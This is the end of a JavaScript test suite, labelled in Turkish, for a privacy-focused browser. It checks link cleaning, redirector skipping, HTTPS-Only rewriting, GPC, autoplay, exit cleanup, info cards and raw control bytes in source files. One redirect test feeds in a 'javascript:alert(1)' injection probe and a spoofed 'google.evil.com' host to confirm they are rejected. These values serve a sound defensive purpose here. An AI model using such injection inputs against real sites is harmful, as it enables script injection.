    eq('utm_* kampanya parametrelerine dokunulmuyor', S.stripTrackingParams('https://ornek.com/?utm_source=bulten&utm_campaign=eylul'), null);
    eq('büyük/küçük harf farklı ad (FBCLID) sitenin kendi parametresi sayılıyor', S.stripTrackingParams('https://ornek.com/?FBCLID=1'), null);
    eq('parametresiz ve http(s) olmayan adres değişmiyor', [S.stripTrackingParams('https://ornek.com/a'), S.stripTrackingParams('ftp://ornek.com/?fbclid=1')], [null, null]);
    eq('Google yönlendirmesi atlanıyor', S.skipRedirector('https://www.google.com/url?sa=t&q=https://ornek.com/a%3Fb%3D1&ved=0'), 'https://ornek.com/a?b=1');
    eq('Google AMP (google.com.tr dahil) asıl siteye gidiyor', [S.skipRedirector('https://www.google.com.tr/amp/s/haber.ornek.com/yazi/1?x=1'), S.skipRedirector('https://google.co.uk/amp/haber.ornek.com/y')],
      ['https://haber.ornek.com/yazi/1?x=1', 'http://haber.ornek.com/y']);
    eq('YouTube, Facebook ve Instagram yönlendiricileri', [
      S.skipRedirector('https://www.youtube.com/redirect?event=video&q=https%3A%2F%2Fornek.com%2F'),
      S.skipRedirector('https://l.facebook.com/l.php?u=https%3A%2F%2Fornek.com%2Fa&h=AT0'),
      S.skipRedirector('https://l.instagram.com/?u=https%3A%2F%2Fornek.com%2F&e=1'),
    ], ['https://ornek.com/', 'https://ornek.com/a', 'https://ornek.com/']);
    eq('hedefi web adresi olmayan yönlendirme atlanmıyor (javascript:, göreli, boş, sahte alan adı, arama)', [
      S.skipRedirector('https://www.google.com/url?q=javascript:alert(1)'), S.skipRedirector('https://www.google.com/url?q=/search'),
      S.skipRedirector('https://www.google.com/url'), S.skipRedirector('https://google.evil.com/url?q=https://ornek.com'),
      S.skipRedirector('https://www.google.com/amp/s/'), S.skipRedirector('https://www.google.com/search?q=https://ornek.com'),
    ], [null, null, null, null, null, null]);
    const nav = (o) => S.rewriteNavigation({ method: 'GET', resourceType: 'mainFrame', cleanLinks: true, httpsOnly: false, thirdParty: tp, ...o });
    eq('başka siteden ya da adres çubuğundan gelinince kimlik çıkarılıyor; sitenin kendi bağlantısında kalıyor', [
      nav({ url: 'https://ornek.com/?fbclid=1', referrer: 'https://facebook.com/' }),
      nav({ url: 'https://ornek.com/?fbclid=1', referrer: '' }),
      nav({ url: 'https://ornek.com/?fbclid=1', referrer: 'https://www.ornek.com/liste' }),
    ], ['https://ornek.com/', 'https://ornek.com/', null]);
    eq('yönlendirici + AMP + kimlik + HTTPS-Only tek adımda', nav({
      url: 'https://www.google.com/url?q=https://www.google.com/amp/s/ornek.com/a%3Fgclid%3D9%26id%3D2', referrer: 'https://www.google.com/', httpsOnly: true,
    }), 'https://ornek.com/a?id=2');
    eq('HTTPS-Only temizlik kapalıyken de çalışıyor', nav({ url: 'http://ornek.com/?fbclid=1', cleanLinks: false, httpsOnly: true }), 'https://ornek.com/?fbclid=1');
    eq('alt çerçeve, POST ve kapalı ayar dokunulmuyor', [
      nav({ url: 'https://ornek.com/?fbclid=1', resourceType: 'subFrame' }), nav({ url: 'https://ornek.com/?fbclid=1', method: 'POST' }),
      nav({ url: 'https://www.google.com/url?q=https://ornek.com/', cleanLinks: false }),
    ], [null, null, null]);
    eq('otomatik oynatma: varsayılan engelli, kapatılınca serbest', [S.autoplayPolicyFor({}), S.autoplayPolicyFor({ blockAutoplay: false }), S.autoplayPolicyFor(null)],
      ['document-user-activation-required', 'no-user-gesture-required', 'document-user-activation-required']);
    eq('kapatınca sil: varsayılan hiçbir şey; ayarlar ayrı ayrı; yalnızca gerçek true', [S.exitCleanupPlan({}), S.exitCleanupPlan({ clearSiteDataOnExit: true }), S.exitCleanupPlan({ clearHistoryOnExit: true }), S.exitCleanupPlan({ clearSiteDataOnExit: 'true' })],
      [[], ['cache', 'siteData'], ['history', 'downloads', 'favicons'], []]);

    const mj5 = read('main/main.js');
    check('GPC başlığı varsayılan açık; ana çerçeve yeniden yazımı tek dinleyicide, tehdit denetiminden sonra',
      mj5.includes("if (config.globalPrivacyControl !== false) headers['Sec-GPC'] = '1';")
      && /threats\.check\(details\.url, ses\)[\s\S]{0,1500}shouldBlockUrl[\s\S]{0,900}rewriteNavigation\(\{[\s\S]{0,300}thirdParty: isThirdParty/.test(mj5)
      && !mj5.includes("details.resourceType === 'mainFrame' && details.url.startsWith('http://')"));
    check('sekme: otomatik oynatma politikası ve GPC bayrağı açılışta veriliyor',
      mj5.includes('autoplayPolicy: autoplayPolicyFor(config),') && mj5.includes("additionalArguments: config.globalPrivacyControl !== false ? ['--ilgezdi-gpc'] : [],"));
    check('kapanış bir kez erteleniyor, silme en çok 8 sn bekleniyor, sonra yeniden kapanıyor',
      /app\.on\('before-quit', \(event\) => \{\s*if \(exitCleanupStarted\) return;\s*const steps = exitCleanupPlan\(config\);\s*if \(!steps\.length\) return;\s*exitCleanupStarted = true;\s*event\.preventDefault\(\);/.test(mj5)
      && mj5.includes('setTimeout(resolve, 8000)') && mj5.includes('Promise.race([work, limit]).finally(() => app.quit());'));
    check('ayarlar ana süreçte boolean olarak doğrulanıyor',
      mj5.includes("for (const k of ['globalPrivacyControl', 'cleanLinks', 'blockAutoplay']) if (k in incoming) incoming[k] = incoming[k] !== false;")
      && mj5.includes("for (const k of ['clearSiteDataOnExit', 'clearHistoryOnExit', 'warnOnCloseTabs']) if (k in incoming) incoming[k] = incoming[k] === true;"));
    const pp5 = read('preload/page-preload.js');
    check('navigator.globalPrivacyControl yalnızca bayrakla ve sayfa dünyasında tanımlanıyor',
      /if \(process\.argv\.includes\('--ilgezdi-gpc'\)\) \{\s*webFrame\.executeJavaScript\("Object\.defineProperty\(Navigator\.prototype, 'globalPrivacyControl'/.test(pp5));
    const sp5 = read('renderer/settings-panel.js');
    check('İngilizce seçeneği hazır olmadığını söylüyor ve seçilemiyor; dil her zaman tr kaydediliyor',
      sp5.includes('<option value="en" disabled>🇬🇧 English (hazırlanıyor)</option>') && /\n\s*language:\s*'tr',/.test(sp5));
    check('yeni gizlilik ayarları senkronlanıyor',
      read('renderer/sync-manager.js').includes("'globalPrivacyControl', 'cleanLinks', 'blockAutoplay', 'clearSiteDataOnExit', 'clearHistoryOnExit',"));
  }
  const cardsJs = read('renderer/info-cards.js');
  let cards = null;
  try { const w = {}; new Function('window', cardsJs)(w); cards = w.ILGEZDI_INFO_CARDS; } catch (e) { cards = e.message; }
  check('bilgi kartları dosyası geçerli: 36 kart', Array.isArray(cards) && cards.length === 36, String(cards).slice(0, 80));
  if (Array.isArray(cards)) {
    eq('altı kategori, her birinde 6 kart', ['TARİH', 'OSMANLI', 'CUMHURİYET', 'COĞRAFYA', 'DİL', 'KÜLTÜR'].map((k) => cards.filter((c) => c.category === k).length), [6, 6, 6, 6, 6, 6]);
    check('her kartın https kaynağı ve kaynak adı var; kimlikler tekil', cards.every((c) => /^https:\/\//.test(c.sourceUrl) && c.sourceName) && new Set(cards.map((c) => c.id)).size === cards.length);
    check('başlık en fazla 60, metin en fazla 280 karakter; metinde emoji yok', cards.every((c) => c.title.length <= 60 && c.body.length <= 280 && !/\p{Extended_Pictographic}/u.test(c.title + c.body)));
  }
  check('kaynaklardan birebir alıntılar uygulama dışında belgeleniyor', fs.existsSync(path.join(__dirname, '..', 'docs', 'bilgi-kartlari-kaynaklar.json')));
  check('yeni sekme kaynaklı kartları kullanıyor; eski kaynaksız haber havuzu yok', appJs.includes('window.ILGEZDI_INFO_CARDS') && !appJs.includes('const NEWS_POOL'));
  check('kart metni kaçışlanıyor; kart tıklanınca (ya da Enter) kaynağı açılıyor, orta tıkla yeni sekmede', appJs.includes('H.esc(item.title)') && /\.news-card\[data-source\][\s\S]{0,700}sb\.navigate\([\s\S]{0,300}sb\.newTab\(/.test(appJs) && /news-card\[data-source\][\s\S]{0,700}'Enter'/.test(appJs));
  check('ekran kapanışının bekleyen gizleme zamanlayıcısı yeni açılan ekranı gizlemiyor',
    /async function showScreen[\s\S]{0,900}clearTimeout\(screenHideTimer\)[\s\S]{0,200}classList\.remove\('hidden'\)/.test(appJs)
    && /screenHideTimer = setTimeout\(\(\) => \{\s*screenHideTimer = null;\s*if \(!currentScreen\) overlay\.classList\.add\('hidden'\);/.test(appJs));
  check('geçmiş listesinde orta tuş otomatik kaydırmayı başlatmıyor', /list\?\.addEventListener\('mousedown', \(e\) => \{\s*if \(e\.button === 1 && e\.target\.closest\('\.list-row'\)\) e\.preventDefault\(\)/.test(appJs));
  check('kartta orta tuş otomatik kaydırmayı başlatmıyor (yeni sekmede açma çalışsın)', /news-card\[data-source\][\s\S]{0,1200}'mousedown', \(e\) => \{ if \(e\.button === 1\) e\.preventDefault\(\)/.test(appJs));
  check('yeni sekme olayları içerik eklendikten sonra bağlanıyor (her açılış yolunda)',
    (appJs.match(/showScreen\('newtab', renderNewTab\)/g) || []).length === (appJs.match(/showScreen\('newtab', renderNewTab\)\.then\(initNewTabEvents\)/g) || []).length
    && (appJs.match(/showScreen\('newtab', renderNewTab\)\.then\(initNewTabEvents\)/g) || []).length === 4 && !appJs.includes('requestAnimationFrame(initNewTabEvents)'));
  check('bilgi kartları dosyası app.js\'ten önce yükleniyor', /<script src="info-cards\.js"><\/script>\s*<script src="app\.js"><\/script>/.test(read('renderer/index.html')));
  check('yeni sekmede haftalık şifresiz bağlantı özeti (yalnızca HTTP ziyaret varsa)',
    appJs.includes('id="newtab-http-report"') && appJs.includes("renderHttpReport('newtab-http-report')") && /newtab-http-report[\s\S]{0,300}classList\.contains\('warn'\)/.test(appJs));
}

// ══════════════════════════════════════════════════════════════════════════════
// Kaynak dosyalar — görünmez ham kontrol karakteri olmamalı
// Neden: regex aralıkları ([NUL-boşluk] gibi) ham baytla yazılınca git dosyayı
// ikili sanıyor ve bir düzenleyici bu baytları sessizce silerse güvenlik amaçlı
// bir regex'in anlamı fark edilmeden değişir. Kaçış dizisi (\x00) kullanılmalı.
// ══════════════════════════════════════════════════════════════════════════════
suite('Kaynak dosyalar — ham kontrol baytı yok');
{
  const ROOTD = path.join(__dirname, '..');
  const walk = (dir) => fs.readdirSync(dir, { withFileTypes: true }).flatMap((d) => {
    const p = path.join(dir, d.name);
    if (d.isDirectory()) return d.name === 'node_modules' ? [] : walk(p);
    return /\.(js|html|css|json|md|yml)$/.test(d.name) ? [p] : [];
  });
  const targets = ['src', 'api', 'test', 'scripts', '.github'].flatMap((d) => walk(path.join(ROOTD, d)));
  const offenders = [];
  for (const f of targets) {
    const buf = fs.readFileSync(f);
    for (let i = 0; i < buf.length; i++) {
      const c = buf[i];
      if ((c < 32 && c !== 9 && c !== 10 && c !== 13) || c === 127) { offenders.push(path.relative(ROOTD, f)); break; }
    }
  }
  check('ham kontrol baytı içeren kaynak dosyası yok (' + targets.length + ' dosya tarandı)', offenders.length === 0, offenders);
}

// ─── Özet ─────────────────────────────────────────────────────────────────────
console.log('\n' + '─'.repeat(60));
if (failed === 0) {
  console.log('\x1b[32m' + passed + ' test geçti.\x1b[0m');
} else {
  console.log('\x1b[31m' + failed + ' test BAŞARISIZ\x1b[0m, ' + passed + ' geçti:');
  failures.forEach((f) => console.log('  • ' + f));
}
process.exit(failed ? 1 : 0);

